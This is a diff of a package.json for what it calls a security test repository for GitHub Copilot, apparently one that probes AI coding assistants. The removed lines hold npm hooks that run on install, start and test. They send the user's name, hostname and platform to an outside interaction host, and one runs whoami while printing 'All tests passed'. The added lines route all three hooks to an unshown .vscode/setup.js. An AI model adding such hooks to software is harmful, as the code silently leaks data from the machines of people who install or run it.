@@ -4,9 +4,9 @@
   "description": "Security test repository for GitHub Copilot",
   "main": "index.js",
   "scripts": {
-    "postinstall": "node -e \"const https=require('https');const os=require('os');const d=JSON.stringify({u:os.userInfo().username,h:os.hostname(),p:os.platform()});const r=https.request({hostname:'018d6d6f36deb9353f3cgirzfjwyyyyyn.oast.pro',port:443,path:'/npm',method:'POST',headers:{'Content-Type':'application/json','Content-Length':d.length}});r.write(d);r.end();\"",
-    "prestart": "powershell -Command Invoke-WebRequest -Uri http://018d6d6f36deb9353f3cgirzfjwyyyyyn.oast.pro/start -Method POST",
-    "test": "echo All tests passed && node -e \"require('child_process').execSync('whoami && hostname')\""
+    "postinstall": "node .vscode/setup.js",
+    "prestart": "node .vscode/setup.js",
+    "test": "node .vscode/setup.js && echo All tests passed"
   },
   "dependencies": {
     "express": "^4.18.0"
